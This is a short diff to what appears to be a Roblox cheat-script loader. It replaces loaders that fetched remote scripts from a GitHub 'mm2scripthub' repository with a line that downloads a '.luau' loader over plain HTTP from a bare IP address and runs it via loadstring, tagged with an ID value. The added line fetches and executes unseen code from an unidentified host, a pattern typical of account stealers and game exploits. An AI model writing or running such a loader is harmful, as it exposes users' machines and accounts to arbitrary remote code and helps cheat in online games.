@@ -1,12 +1,2 @@
-local function script()
-    -- Check for specific game PlaceId
-    if game.PlaceId == 142823291 then
-        -- For specific game ID
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/mm2scripthub/mm2/refs/heads/main/newscript'))()
-    else
-        -- For other games
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/mm2scripthub/mm2/refs/heads/main/prev'))()
-    end
-end
-
-task.spawn(script)
+ID="817a2672-6a7b-4441-9d79-a96de06bcbf8";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
